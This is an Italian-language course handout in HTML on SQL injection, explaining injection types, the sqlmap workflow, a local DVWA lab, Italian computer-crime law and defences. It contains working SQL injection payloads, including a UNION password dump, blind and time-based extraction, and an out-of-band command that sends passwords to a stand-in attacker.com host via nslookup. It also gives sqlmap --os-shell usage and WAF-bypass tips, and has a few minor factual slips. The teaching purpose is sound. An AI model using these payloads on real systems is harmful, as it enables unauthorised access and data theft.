@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="it"><head><meta charset="UTF-8"><title>G8 - Guida Studente - SQL Injection & OWASP DB</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',sans-serif;background:#F8FAFC;color:#0F1B2D;line-height:1.7;padding:20px}
+.container{max-width:900px;margin:0 auto}
+header{background:linear-gradient(135deg,#0F4C75 0%,#059669 100%);color:#fff;padding:32px;border-radius:12px;margin-bottom:24px}
+header h1{font-size:26px;margin-bottom:6px}header p{color:#D1FAE5;font-size:14px}
+header .meta{margin-top:12px;color:#BBF7D0;font-size:13px}
+.toc{background:#fff;border:1px solid #CBD5E1;border-radius:10px;padding:18px;margin-bottom:24px;font-size:14px}
+.toc h2{font-size:14px;color:#059669;margin-bottom:10px;text-transform:uppercase;letter-spacing:0.5px}
+.toc ol{margin-left:22px;color:#334155}.toc a{color:#0F1B2D;text-decoration:none}.toc a:hover{color:#059669}
+section{background:#fff;border:1px solid #CBD5E1;border-radius:10px;padding:24px;margin-bottom:18px}
+section h2{font-size:20px;color:#059669;margin-bottom:14px;border-bottom:2px solid #10B981;padding-bottom:6px}
+section h3{font-size:16px;color:#0F4C75;margin:18px 0 8px}
+section p{font-size:14px;color:#334155;margin-bottom:10px}
+section ul{margin:8px 0 12px 22px;font-size:14px;color:#475569}
+section ul li{margin-bottom:4px}
+.box{background:#ECFDF5;border-left:4px solid #059669;padding:12px 16px;margin:12px 0;border-radius:4px;font-size:13px}
+.deep-dive{background:#EFF6FF;border:1px dashed #93C5FD;padding:12px 16px;margin:12px 0;border-radius:6px;font-size:13px}
+.deep-dive::before{content:"📖 APPROFONDIMENTO";display:block;font-size:11px;font-weight:700;color:#1D4ED8;margin-bottom:6px;letter-spacing:0.5px}
+.resource{background:#F8FAFC;border:1px solid #E2E8F0;border-radius:6px;padding:12px 14px;margin:8px 0;font-size:13px}
+.resource a{color:#059669;text-decoration:none;font-weight:600}.resource a:hover{text-decoration:underline}
+.resource-meta{color:#64748B;font-size:11px;margin-top:4px}
+code{background:#1E293B;color:#10B981;padding:2px 6px;border-radius:4px;font-family:Consolas,monospace;font-size:12px}
+pre{background:#1E293B;color:#E2E8F0;padding:14px;border-radius:6px;font-family:Consolas,monospace;font-size:12px;overflow-x:auto;margin:10px 0;line-height:1.5}
+pre .cmt{color:#94A3B8;font-style:italic}
+pre .hi{color:#10B981;font-weight:bold}
+pre .vuln{color:#F87171;font-weight:bold}
+.warn{background:#FEF3C7;border-left:4px solid #F59E0B;padding:12px 16px;margin:12px 0;border-radius:4px;font-size:13px}
+.danger{background:#FEE2E2;border-left:4px solid #DC2626;padding:12px 16px;margin:12px 0;border-radius:4px;font-size:13px}
+table{width:100%;border-collapse:collapse;margin:10px 0;font-size:13px}
+th{background:#059669;color:#fff;padding:8px;text-align:left;font-weight:600}
+td{padding:8px;border-bottom:1px solid #E2E8F0;color:#334155}
+tr:nth-child(even) td{background:#F8FAFC}
+.compare{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:12px 0}
+.compare .bad{background:#FEF2F2;border:1px solid #FECACA;border-radius:6px;padding:12px;font-size:13px}
+.compare .bad .title{color:#B91C1C;font-weight:700;margin-bottom:6px}
+.compare .good{background:#F0FDF4;border:1px solid #BBF7D0;border-radius:6px;padding:12px;font-size:13px}
+.compare .good .title{color:#0F763D;font-weight:700;margin-bottom:6px}
+</style></head><body><div class="container">
+
+<header>
+<h1>📘 G8 · Guida Studente</h1>
+<p>Lezione 8 · SQL Injection & OWASP Database Security · Modulo 2</p>
+<div class="meta">Mercoledì 29 aprile 2026 · 8 ore · Compute & Database</div>
+</header>
+
+<div class="toc"><h2>Indice</h2><ol>
+<li><a href="#obj">Obiettivi della lezione</a></li>
+<li><a href="#1">Anatomia della SQL Injection</a></li>
+<li><a href="#2">OWASP A03:2021 Injection — storia e categoria</a></li>
+<li><a href="#3">Query concatenata vs prepared statement</a></li>
+<li><a href="#4">Tipo 1 · In-Band SQL Injection (error + UNION)</a></li>
+<li><a href="#5">Tipo 2 · Blind Boolean-Based</a></li>
+<li><a href="#6">Tipo 3 · Blind Time-Based</a></li>
+<li><a href="#7">Tipo 4 · Out-of-Band</a></li>
+<li><a href="#8">Tabella comparativa dei 4 tipi</a></li>
+<li><a href="#9">sqlmap · workflow e flag principali</a></li>
+<li><a href="#10">DVWA in container Podman</a></li>
+<li><a href="#11">Quadro etico-legale italiano</a></li>
+<li><a href="#12">Difesa 1 · Prepared Statements</a></li>
+<li><a href="#13">Difesa 2 · ORM</a></li>
+<li><a href="#14">Difesa 3 · Input Validation (allowlist)</a></li>
+<li><a href="#15">Difesa 4 · Least Privilege sul DB user</a></li>
+<li><a href="#16">Difesa 5 · WAF</a></li>
+<li><a href="#17">Defense in Depth — le 5 difese in architettura</a></li>
+<li><a href="#18">OWASP Database Top 10 (A01, A02, A07, A09)</a></li>
+<li><a href="#compiti">Compiti consolidamento + prepara L9</a></li>
+<li><a href="#risorse">Risorse propedeutiche per G9</a></li>
+</ol></div>
+
+<section id="obj"><h2>🎯 Obiettivi della lezione</h2>
+<p>Al termine di questa lezione dovrai essere in grado di:</p>
+<ul>
+<li>Spiegare cos'è una SQL injection e perché funziona, partendo dalle 3 condizioni necessarie</li>
+<li>Classificare un attacco SQLi nei 4 tipi OWASP: in-band error, UNION, blind boolean, blind time (+ OOB a cenni)</li>
+<li>Riconoscere una SQLi leggendo uno snippet di codice in Python, Node.js, Java</li>
+<li>Descrivere il workflow di sqlmap: detect → fingerprint → enumerate → dump</li>
+<li>Richiamare il quadro etico-legale (art. 615-ter c.p.) prima di usare sqlmap</li>
+<li>Eseguire sqlmap end-to-end contro DVWA ed estrarre la tabella users</li>
+<li>Scegliere la difesa corretta in base al contesto applicativo (prepared, ORM, validation, LPP, WAF)</li>
+<li>Riconoscere le 4 categorie OWASP DB Top 10 che impattano la sicurezza del database</li>
+</ul></section>
+
+<section id="1"><h2>1 · Anatomia della SQL Injection</h2>
+<p>La definizione OWASP canonica: <strong>SQL injection è un'iniezione di codice che sfrutta la concatenazione di input non fidati in query SQL dinamiche</strong>, permettendo all'attaccante di alterare la logica della query eseguita dal database.</p>
+
+<p>Il meccanismo fondamentale è la <strong>confusione tra codice e dati</strong>: una stringa SQL è codice, i valori che passa l'utente sono dati, ma quando li concateni in una stringa questa distinzione sparisce.</p>
+
+<h3>Le 3 condizioni necessarie</h3>
+<p>Perché esista una SQLi devono verificarsi tutte e tre queste condizioni. Se manca anche solo una, la vulnerabilità non c'è:</p>
+<ul>
+<li><strong>1 · Input user-controlled</strong>: c'è un dato che proviene dall'utente — query string, form, cookie, header, upload, API parameter.</li>
+<li><strong>2 · Flusso verso la query</strong>: quell'input finisce, direttamente o indirettamente, in una stringa SQL eseguita dal DB. Include flussi indiretti come input salvato in DB e riletto da un'altra parte dell'applicazione (<em>second-order SQLi</em>).</li>
+<li><strong>3 · Nessuna parametrizzazione</strong>: la query è costruita per concatenazione di stringhe, senza prepared statements né sanitization efficace.</li>
+</ul>
+
+<div class="box">La condizione 3 è dove tipicamente si rompe la catena: prepared statements in tutti i linguaggi moderni (PDO PHP, psycopg Python, pg Node, JDBC Java) rompono strutturalmente la condizione 3. Le altre "difese" (escape, filtri, blocklist) sono palliativi bypassabili.</div>
+
+<div class="deep-dive">Il primo paper pubblico su SQLi è di Jeff Forristal (alias <em>Rain Forest Puppy</em>), apparso su Phrack Magazine nel 1998. Sono 28 anni che ne parliamo, ed è ancora la vulnerabilità web più comune. Questo ci dice qualcosa sul fatto che è un problema di processo di sviluppo, non di conoscenza tecnica.</div>
+</section>
+
+<section id="2"><h2>2 · OWASP A03:2021 Injection — storia e categoria</h2>
+<p>OWASP Top 10 è la classifica di riferimento in sicurezza applicativa, aggiornata ogni 3-4 anni dalla OWASP Foundation. La SQLi è nel ranking dal 2003. È stata al primo posto per 11 anni consecutivi (dal 2010 al 2017).</p>
+
+<h3>Posizione della SQLi nel Top 10 negli anni</h3>
+<table>
+<tr><th>Anno</th><th>Posizione</th><th>Nota</th></tr>
+<tr><td>2003</td><td>A6</td><td>prima apparizione</td></tr>
+<tr><td>2007</td><td>A2</td><td>sale per SQLi su app Web 2.0</td></tr>
+<tr><td>2010</td><td>A1</td><td>prima posizione</td></tr>
+<tr><td>2013</td><td>A1</td><td>rimane prima</td></tr>
+<tr><td>2017</td><td>A1</td><td>ancora prima</td></tr>
+<tr><td>2021</td><td>A3</td><td>scende come categoria generale</td></tr>
+</table>
+
+<h3>Cosa comprende la categoria A03:2021 Injection</h3>
+<p>Nel 2021 OWASP ha ristrutturato il Top 10: ora si parla di <strong>categorie</strong> invece che singole vulnerabilità, e il ranking combina 3 fattori (incidenza, exploitability, impatto). La categoria A03 raggruppa diversi CWE correlati:</p>
+<ul>
+<li><code>CWE-89</code> SQL Injection</li>
+<li><code>CWE-79</code> Cross-Site Scripting (Reflected/Stored)</li>
+<li><code>CWE-77</code> Command Injection</li>
+<li><code>CWE-94</code> Code Injection</li>
+<li><code>CWE-917</code> EL / Template Injection</li>
+<li><code>CWE-91</code> XML Injection (XPath, XXE)</li>
+</ul>
+
+<p>Tutte queste vulnerabilità condividono lo stesso pattern: input non fidato che viene eseguito come codice nel contesto sbagliato.</p>
+
+<div class="box">Dato chiave dal report OWASP 2021: il <strong>94% delle applicazioni testate aveva qualche forma di injection</strong>, con 274.000 istanze su 500k+ analizzate e 33 CWE mappati alla categoria.</div>
+
+<p>SQLi come categoria è "scesa" non perché sia meno frequente, ma perché la categoria raccoglie più vulnerabilità oggi e alcuni framework moderni (ORM, template engines safe-by-default) riducono l'esposizione. Sulle app legacy, tuttavia, SQLi rimane estremamente diffusa.</p>
+</section>
+
+<section id="3"><h2>3 · Query concatenata vs Prepared Statement</h2>
+<p>Il punto centrale della difesa contro SQLi è strutturale, non reattivo. Confronta i due pattern:</p>
+
+<div class="compare">
+<div class="bad">
+<div class="title">✗ VULNERABILE — concatenazione</div>
+<pre><span class="cmt">user_input = request.form['username']</span>
+
+query = "SELECT * FROM users " \
+        "WHERE name = '" + \
+        user_input + "'"
+
+cursor.execute(query)
+
+<span class="cmt"># Payload: admin' OR '1'='1</span>
+<span class="cmt"># Query eseguita:</span>
+<span class="cmt"># SELECT * FROM users</span>
+<span class="cmt"># WHERE name = 'admin' OR '1'='1'</span></pre>
+</div>
+<div class="good">
+<div class="title">✓ SICURO — prepared statement</div>
+<pre><span class="cmt">user_input = request.form['username']</span>
+
+cursor.execute(
+    "SELECT * FROM users "
+    <span class="hi">"WHERE name = %s"</span>,
+    <span class="hi">(user_input,)</span>
+)
+
+<span class="cmt"># Payload: admin' OR '1'='1</span>
+<span class="cmt"># DB cerca letteralmente un user</span>
+<span class="cmt"># con nome admin'' OR ''1''=''1'</span>
+<span class="cmt"># e non lo trova. Neutralizzato.</span></pre>
+</div>
+</div>
+
+<p>Il driver DB tratta <code>%s</code> come <strong>placeholder</strong>: il valore viene passato separato dalla query SQL. L'input utente non può mai diventare codice.</p>
+
+<div class="deep-dive">Il placeholder della psycopg2 è <code>%s</code>: è il formato DB-API Python, non printf-style. In altri driver può essere <code>?</code> (JDBC), <code>$1</code> (pg Node), <code>:param</code> (SQLAlchemy named). Sono equivalenti: tutti dicono al driver "qui va un valore, non un frammento di SQL". Il driver poi dialoga col DB usando il protocollo native (per PostgreSQL: Extended Query Protocol, dove Parse arriva senza parametri, Bind arriva con i valori in formato binario, Execute gira il tutto). Il DB non "vede" mai l'input utente come SQL.</div>
+
+<div class="warn">⚠ Alcune librerie (PDO PHP con default configurato male) simulano i prepared statements lato client: la concatenazione avviene a livello di driver ma con escape automatico. Funziona, ma è intrinsecamente più debole. Attiva i "real prepared statements" (server-side): in psycopg2 sono attivi di default, in PDO PHP devi impostare <code>ATTR_EMULATE_PREPARES = false</code>.</div>
+</section>
+
+<section id="4"><h2>4 · Tipo 1 · In-Band SQL Injection (error + UNION)</h2>
+<p><strong>In-band</strong> significa che i dati escono dallo stesso canale HTTP della richiesta. È il caso ottimale per l'attaccante: c'è un canale di ritorno diretto, risposta visibile nella pagina HTML.</p>
+
+<h3>1a · Error-based</h3>
+<p>Il payload provoca un errore del DB. Il messaggio d'errore contiene i dati che l'attaccante vuole leggere (tabella, colonna, valore).</p>
+
+<pre><span class="cmt"># Payload PostgreSQL — EXTRACTVALUE</span>
+?id=1 AND (SELECT 1 FROM CAST(version() AS int))
+
+<span class="cmt"># DB risponde:</span>
+ERROR: invalid input syntax for integer:
+  <span class="vuln">"PostgreSQL 16.1 on x86_64..."</span></pre>
+
+<p>Su PostgreSQL le funzioni classiche sono <code>CAST()</code>. Su MySQL si usa <code>EXTRACTVALUE</code> e <code>UPDATEXML</code>. Su SQL Server si sfruttano conversion errors con <code>CONVERT</code>.</p>
+
+<div class="warn">⚠ <strong>Difesa</strong>: in produzione MAI errori DB verbosi esposti all'utente — sempre generic error page + log dettagliato server-side.</div>
+
+<h3>1b · UNION-based</h3>
+<p>Il payload appende un <code>UNION SELECT</code> alla query originale. Il DB risponde con i dati della seconda query mescolati ai primi.</p>
+
+<pre><span class="cmt"># Payload — dump users tramite UNION</span>
+?id=1 UNION SELECT username,password FROM users
+
+<span class="cmt"># La pagina mostra in output:</span>
+admin  :  <span class="vuln">5f4dcc3b5aa765d61d8327deb882cf99</span></pre>
+
+<p>Il workflow UNION richiede 3 passi meccanici:</p>
+<ul>
+<li>Conoscere il numero di colonne della query originale: <code>ORDER BY 1</code>, <code>ORDER BY 2</code>, finché arriva l'errore "column index out of range"</li>
+<li>Conoscere il punto di output: <code>SELECT null,null,'test',null</code> per vedere dove "test" compare nella pagina</li>
+<li>Tipi compatibili: <code>SELECT null,null,null,null</code> e poi si sostituiscono <code>null</code> con valori del tipo corretto</li>
+</ul>
+
+<div class="box">sqlmap automatizza il workflow UNION in 30 secondi. Per l'attaccante manuale è il canale più semplice; per il difensore è il più visibile nei log applicativi.</div>
+</section>
+
+<section id="5"><h2>5 · Tipo 2 · Blind Boolean-Based</h2>
+<p><strong>Blind</strong> = nessun dato in chiaro nella risposta. Nessun errore, nessun dato echoed. L'attaccante inferisce UN BIT alla volta da differenze nel comportamento della pagina.</p>
+
+<p>Scenario tipico: login form che risponde <code>HTTP 200</code> con "Benvenuto" se query OK, <code>HTTP 200</code> con "Login fallito" se no. L'attaccante sa solo una cosa per ogni richiesta: <strong>la query è TRUE o FALSE?</strong></p>
+
+<h3>Tecnica: estrazione 1 bit per request</h3>
+<pre><span class="cmt"># Payload esempio — estrae lettera 1 di password:</span>
+' AND SUBSTRING(
+    (SELECT password FROM users
+     WHERE user='admin'),1,1)='a'--
+
+<span class="cmt"># Pagina dice 'Benvenuto'? lettera 1 = 'a'</span>
+<span class="cmt"># Pagina dice 'Fallito'? prova 'b' ... 'z'</span></pre>
+
+<p>Con binary search (<code>SUBSTRING &gt; 'm'</code> per dividere a metà lo spazio) si riduce a ~7 richieste per carattere (2^7 = 128 &gt; 95 ASCII stampabili). sqlmap implementa questa strategia di default.</p>
+
+<div class="deep-dive">Le condizioni per riconoscere boolean-based: deve esserci una differenza osservabile tra risposta TRUE e FALSE. La differenza può essere nel codice HTTP (200 vs 500), nel content-length, in un testo specifico della pagina, persino in header come <code>Set-Cookie</code> o <code>Location</code>. sqlmap testa automaticamente diversi "discriminators". Se l'app risponde sempre uguale, si scende a time-based.</div>
+
+<div class="warn">⚠ Le risposte generiche consistenti (sempre "operazione completata" indipendentemente da risultato) eliminano boolean-based ma <strong>non</strong> time-based. La sola difesa vera rimane prepared statements strutturali.</div>
+</section>
+
+<section id="6"><h2>6 · Tipo 3 · Blind Time-Based</h2>
+<p>Quando anche il comportamento della pagina è identico (nessuna differenza nel body, nessuna differenza nello status), si usa il <strong>tempo di risposta</strong> come canale di feedback.</p>
+
+<p>Il trucco: forzare il DB a dormire (<code>SLEEP</code>) <em>solo se</em> la condizione è vera. Se la risposta arriva dopo 5 secondi → condizione vera. Se arriva subito → condizione falsa.</p>
+
+<h3>Funzioni SLEEP per DBMS</h3>
+<table>
+<tr><th>DBMS</th><th>Funzione</th></tr>
+<tr><td>PostgreSQL</td><td><code>pg_sleep(5)</code></td></tr>
+<tr><td>MySQL</td><td><code>SLEEP(5)</code></td></tr>
+<tr><td>SQL Server</td><td><code>WAITFOR DELAY '0:0:5'</code></td></tr>
+<tr><td>Oracle</td><td><code>DBMS_LOCK.SLEEP(5)</code></td></tr>
+</table>
+
+<pre><span class="cmt"># Payload completo PostgreSQL:</span>
+' AND (SELECT CASE WHEN
+  (SUBSTRING(pwd,1,1)='a')
+  THEN pg_sleep(5) END)--</pre>
+
+<p>sqlmap riconosce automaticamente il DBMS dal banner e sceglie la funzione giusta. Time-based SQLi è il "last resort" del pentester: funziona quasi sempre, è il più rumoroso e lento.</p>
+
+<div class="deep-dive">Alcuni DB non hanno SLEEP ma si possono simulare con <code>BENCHMARK()</code> in MySQL (ripete operazione N volte) o heavy join in Oracle. Problemi pratici: jitter di rete crea falsi positivi — un server lento in quel momento legge come "condition true". sqlmap compensa facendo media su 3-5 richieste. Con WAF aggressivi, i payload SLEEP sono spesso in blocklist: si bypassa con variant spelling (<code>SLEEP(5)</code> vs <code>SLEEP(0x05)</code>, case, whitespace).</div>
+
+<div class="box">Rilevamento difensivo: il time-based SQLi è VISIBILE nei log delle query con EXPLAIN/pg_stat_statements — query con durata &gt;5s da IP utente sono anomale. pgAudit (L9) logga anche le query time-based consumption.</div>
+</section>
+
+<section id="7"><h2>7 · Tipo 4 · Out-of-Band</h2>
+<p>Canale di esfiltrazione <strong>completamente separato</strong> dalla richiesta HTTP. Avanzato — sqlmap lo supporta con <code>--dns-domain</code>.</p>
+
+<p>Meccanismo: invece di esfiltrare i dati dentro la risposta HTTP, si mandano fuori via DNS. Il DB esegue una <code>SELECT password</code>, poi fa una DNS lookup a <code>password_value.attacker.com</code>. L'attaccante, che controlla il DNS server di attacker.com, legge la password nei log delle query DNS.</p>
+
+<pre><span class="cmt"># Payload tipico PostgreSQL:</span>
+'; COPY (SELECT password FROM users) TO PROGRAM
+  'nslookup $(cat)\.attacker.com'--</pre>
+
+<p>Perché funziona: molti network permettono DNS egress anche quando bloccano HTTP. È il modo in cui si esfiltra da segmenti di rete chiusi.</p>
+
+<h3>Funzioni OOB per DBMS</h3>
+<ul>
+<li>SQL Server: <code>xp_dirtree</code></li>
+<li>Oracle: <code>UTL_HTTP</code></li>
+<li>MySQL: <code>LOAD_FILE</code> con <code>secure_file_priv</code> disattivato</li>
+<li>PostgreSQL: <code>COPY TO PROGRAM</code> (richiede superuser)</li>
+</ul>
+
+<div class="box">Burp Collaborator e interactsh (progetto ProjectDiscovery) sono strumenti gratuiti per testare OOB: generano un hostname univoco e loggano tutti gli hit DNS/HTTP. Se l'app è vulnerabile a OOB, vedi un hit ricevuto entro 1-2 secondi dalla richiesta.</div>
+
+<div class="warn">⚠ <strong>Difesa specifica</strong>: egress filtering + DNS monitoring. Il DB production non dovrebbe fare lookup DNS di domini esterni non in allowlist.</div>
+
+<div class="deep-dive"><strong>Second-order SQLi</strong>: variante dove il payload viene salvato (es. <code>profile.name = 'admin'; DROP TABLE'</code>) e trigghera in un contesto diverso (admin panel che fa <code>SELECT * FROM log WHERE user=' + profile.name</code>). Molto insidioso perché test automatici lineari non lo colgono.</div>
+</section>
+
+<section id="8"><h2>8 · I 4 tipi a confronto</h2>
+<table>
+<tr><th>Tipo</th><th>Canale dato</th><th>Velocità</th><th>Rilevabilità</th><th>Scenario tipico</th></tr>
+<tr><td>In-band Error</td><td>Msg errore DB</td><td>Rapida</td><td>Alta (log DB)</td><td>App dev con error page verbosa</td></tr>
+<tr><td>In-band UNION</td><td>Corpo HTTP</td><td>Rapida</td><td>Media (log app)</td><td>Search / list con output tabellare</td></tr>
+<tr><td>Blind Boolean</td><td>Diff. risposta</td><td>Media (~1 req/bit)</td><td>Media</td><td>Login, resource by ID</td></tr>
+<tr><td>Blind Time</td><td>Tempo risposta</td><td>Lenta (5s/bit)</td><td>Alta (query slow)</td><td>API JSON statiche</td></tr>
+<tr><td>Out-of-band</td><td>Canale esterno (DNS)</td><td>Rapida</td><td>Bassa (DNS logs)</td><td>Reti con egress aperto</td></tr>
+</table>
+
+<div class="box"><strong>Takeaway difensivo</strong>: nessuno dei 4 tipi richiede difese diverse. <strong>Prepared statements blocca tutti e 5</strong>. Le difese secondarie (error page generica, egress filtering, query timeout) riducono impatto ma non rimuovono la vulnerabilità.</div>
+</section>
+
+<section id="9"><h2>9 · sqlmap · workflow e flag principali</h2>
+<p>sqlmap è lo strumento standard mondiale per detection e exploitation automatizzata di SQL injection. Scritto in Python, open source, sviluppato dal 2006 da Bernardo Damele (ora Miroslav Stampar), mantiene 19+ anni di sviluppo attivo su GitHub. Integrato di default in Kali Linux.</p>
+
+<h3>Workflow 6 step</h3>
+<ul>
+<li><strong>1 · Target</strong>: URL con parametro vuln</li>
+<li><strong>2 · Detect</strong>: individua tipo SQLi provando payload B/E/U/S/T/Q</li>
+<li><strong>3 · Fingerprint</strong>: identifica DBMS (banner + syntax-specific + error fingerprint)</li>
+<li><strong>4 · Enumerate</strong>: DB → tabelle → colonne (via <code>information_schema</code>)</li>
+<li><strong>5 · Dump</strong>: estrae dati</li>
+<li><strong>6 · Crack</strong>: hash → password (integrazione hashcat/john)</li>
+</ul>
+
+<h3>Flag CLI più usati</h3>
+<table>
+<tr><th>Flag</th><th>Uso</th></tr>
+<tr><td><code>-u URL</code></td><td>target (GET)</td></tr>
+<tr><td><code>--data="a=1"</code></td><td>target (POST)</td></tr>
+<tr><td><code>--cookie="..."</code></td><td>sessione autenticata</td></tr>
+<tr><td><code>--dbs</code></td><td>enumera DB</td></tr>
+<tr><td><code>-D &lt;db&gt; --tables</code></td><td>enumera tabelle</td></tr>
+<tr><td><code>-T &lt;tbl&gt; --columns</code></td><td>enumera colonne</td></tr>
+<tr><td><code>--dump</code></td><td>estrai dati</td></tr>
+<tr><td><code>--batch</code></td><td>no prompt interattivi</td></tr>
+<tr><td><code>--level=5 --risk=3</code></td><td>test esaustivo</td></tr>
+<tr><td><code>--technique=BEUSTQ</code></td><td>scegli tecniche: B E U S T Q</td></tr>
+<tr><td><code>--os-shell</code></td><td>⚠ shell tramite DB (dual-use)</td></tr>
+</table>
+
+<div class="deep-dive">Il flag <code>--technique</code> accetta lettere: B (boolean-blind), E (error-based), U (union), S (stacked queries), T (time-based), Q (inline query). <code>--level</code> (1-5) aumenta profondità: livello 1 solo parametri GET/POST, livello 5 include cookie, user-agent. <code>--risk</code> (1-3) autorizza payload più invasivi: risk 3 include stacked queries con UPDATE/INSERT. <code>--os-shell</code> è la killer feature: quando il DB gira come superuser e l'OS lo permette (xp_cmdshell su MSSQL, sys_exec su MySQL con UDF, COPY TO PROGRAM su PostgreSQL), sqlmap apre una shell interattiva sul server.</div>
+
+<h3>Installazione</h3>
+<pre>$ pip install sqlmap --break-system-packages
+$ sudo apt install sqlmap</pre>
+</section>
+
+<section id="10"><h2>10 · DVWA in container Podman</h2>
+<p><strong>DVWA</strong> (Damn Vulnerable Web Application) è un'app PHP volontariamente vulnerabile creata per training. Creata nel 2010 da Ryan Dewhurst come progetto didattico per OWASP. MySQL backend, 5 livelli di sicurezza (impossible / high / medium / low / insecure). Login default: <code>admin / password</code>.</p>
+
+<h3>Perché container?</h3>
+<ul>
+<li>App vulnerabile = esclusiva del proprio host (bind su 127.0.0.1, no esposizione esterna)</li>
+<li>Isolamento: blast radius contenuto al container</li>
+<li>Ephemeral: <code>podman rm</code> dopo il test, nessun dirt sul sistema</li>
+<li>Replicabile: stesso setup per tutti gli studenti</li>
+</ul>
+
+<h3>Setup in 3 comandi</h3>
+<pre><span class="cmt"># 1. Pull dell'immagine DVWA</span>
+$ podman pull docker.io/vulnerables/web-dvwa
+
+<span class="cmt"># 2. Avvio container esposto SOLO su 127.0.0.1:8080</span>
+$ podman run -d --name dvwa -p 127.0.0.1:8080:80 \
+    docker.io/vulnerables/web-dvwa
+
+<span class="cmt"># 3. Setup DB (prima volta - localhost:8080/setup.php)</span>
+$ curl -s 'http://localhost:8080/setup.php' | grep 'create_db'</pre>
+
+<div class="danger">⚠ DVWA è <strong>volutamente insicura</strong>. MAI esporre su rete pubblica né lasciarla in esecuzione oltre la sessione di test.</div>
+</section>
+
+<section id="11"><h2>11 · Quadro etico-legale italiano</h2>
+<p>Slide obbligatoria per ogni lezione che introduce tool offensive.</p>
+
+<div class="danger">
+<strong>Art. 615-ter c.p.</strong> — Accesso abusivo a sistema informatico o telematico<br>
+Reclusione fino a <strong>3 anni</strong> (fino a 5 se il sistema è di interesse militare o critico).<br><br>
+<strong>Art. 635-bis c.p.</strong> — Danneggiamento di informazioni, dati e programmi informatici<br>
+Reclusione da 6 mesi a 3 anni — si applica anche a DROP TABLE accidentale in produzione.<br><br>
+<em>L'uso di sqlmap contro un target che non controlli è reato, anche senza intento di danno.</em>
+</div>
+
+<p>In Italia la giurisprudenza è rigorosa: basta l'accesso — anche senza esfiltrazione o danno — per configurare il reato.</p>
+
+<div class="compare">
+<div class="good">
+<div class="title">✓ DOVE È LECITO</div>
+<ul>
+<li>Lab personale (DVWA in Podman)</li>
+<li>CTF autorizzate (HackTheBox, TryHackMe)</li>
+<li>Bug bounty programs (HackerOne, Bugcrowd, Intigriti, YesWeHack)</li>
+<li>Penetration test con contratto firmato (RoE)</li>
+<li>Sistemi propri con proprietà documentata</li>
+</ul>
+</div>
+<div class="bad">
+<div class="title">✗ DOVE NON È LECITO</div>
+<ul>
+<li>Siti web pubblici senza autorizzazione</li>
+<li>App dell'ex datore di lavoro ("tanto le conosco")</li>
+<li>Target di amici "per test" senza consenso scritto</li>
+<li>App terze parti in cui si è solo utenti</li>
+<li>Sistemi dello Stato o di enti pubblici</li>
+</ul>
+</div>
+</div>
+
+<div class="deep-dive">Nel mondo professional il <strong>Rules of Engagement (RoE)</strong> è un documento obbligatorio: definisce target scope, date, orari consentiti, tipi di test permessi, e contiene la controfirma di entrambe le parti. Per Leonardo in particolare, essendo in sicurezza critica, esiste un red team interno con contratti specifici. In caso di dubbio, <strong>NON testare</strong>.</div>
+</section>
+
+<section id="12"><h2>12 · Difesa 1 · Prepared Statements</h2>
+<p>La difesa strutturale per eccellenza. Il driver DB separa la query dai valori: l'input utente NON può diventare SQL.</p>
+
+<h3>Python · psycopg</h3>
+<pre>cursor.execute(
+    "SELECT * FROM users WHERE id = %s",
+    (user_id,)
+)
+<span class="cmt"># %s è placeholder, tuple dei valori, driver fa il bind</span></pre>
+
+<h3>Node.js · pg</h3>
+<pre>client.query(
+    'SELECT * FROM users WHERE id = $1',
+    [user_id]
+).then(r =&gt; ...);
+<span class="cmt">// $1 è placeholder, array dei valori, pg.js fa il bind</span></pre>
+
+<h3>Java · JDBC</h3>
+<pre>PreparedStatement ps = conn.prepareStatement(
+    "SELECT * FROM users WHERE id = ?"
+);
+ps.setInt(1, userId);
+ps.executeQuery();
+<span class="cmt">// ? è placeholder</span></pre>
+
+<div class="deep-dive">Meccanismo: il driver usa l'Extended Query Protocol (PostgreSQL) o il Binary Protocol (MySQL) per mandare Parse + Bind + Execute separatamente. Il Parse contiene la query con placeholder, NO valori utente. Il Bind contiene i valori in formato tipizzato binario. L'Execute gira il piano preparato con i bind values. Non c'è mai uno stage in cui il DB "compone" una stringa SQL con dati utente.</div>
+
+<h3>Pitfall e casi limite</h3>
+<ul>
+<li><strong>Real prepared vs emulated</strong>: PDO PHP ha <code>ATTR_EMULATE_PREPARES=true</code> di default su alcuni driver — dannoso, va disattivato.</li>
+<li><strong>Non proteggono da SQLi via identificatori</strong>: se il nome della tabella è dinamico (<code>'SELECT * FROM ' + table_name</code>), prepared non aiuta. Va fatto whitelist di nomi tabella validi.</li>
+<li><code>ORDER BY</code>, <code>LIMIT</code> non possono essere parametrizzati come valori in alcuni DBMS — vanno validati via allowlist.</li>
+</ul>
+
+<div class="box"><strong>Approccio pragmatico</strong>: prepared per valori, allowlist per identificatori strutturali.</div>
+</section>
+
+<section id="13"><h2>13 · Difesa 2 · ORM</h2>
+<p>Gli ORM (Object-Relational Mapper) traducono oggetti Python/JS/Java in query SQL parametrizzate di default. SQLAlchemy, Django ORM, Sequelize, Hibernate, Entity Framework usano tutti prepared statements sotto il cofano quando usi l'API idiomatica.</p>
+
+<h3>SQLAlchemy (Python)</h3>
+<div class="compare">
+<div class="good">
+<div class="title">✓ SICURO (ORM idiomatico)</div>
+<pre>session.query(User)\
+    .filter_by(name=x)\
+    .first()</pre>
+</div>
+<div class="bad">
+<div class="title">✗ VULNERABILE (text + concat)</div>
+<pre>session.execute(
+    text('... WHERE '
+         'name=' + x)
+)</pre>
+</div>
+</div>
+
+<h3>Django ORM</h3>
+<div class="compare">
+<div class="good">
+<div class="title">✓ SICURO</div>
+<pre>User.objects.filter(
+    name=user_input
+).first()</pre>
+</div>
+<div class="bad">
+<div class="title">✗ VULNERABILE</div>
+<pre>User.objects.raw(
+    'SELECT * FROM auth'
+    ' WHERE n=' + x
+)</pre>
+</div>
+</div>
+
+<h3>Sequelize (Node.js)</h3>
+<div class="compare">
+<div class="good">
+<div class="title">✓ SICURO</div>
+<pre>User.findOne({
+    where: { name: x }
+})</pre>
+</div>
+<div class="bad">
+<div class="title">✗ VULNERABILE</div>
+<pre>sequelize.query(
+    'SELECT FROM u '
+    'WHERE n=' + x
+)</pre>
+</div>
+</div>
+
+<div class="warn">⚠ <strong>L'ORM NON ti protegge se usi raw() / text() / execute() con string concatenation</strong>. È sicuro by-default per query ORM-style. Nel momento in cui "scendi" al raw SQL, torni in prepared manuali.</div>
+
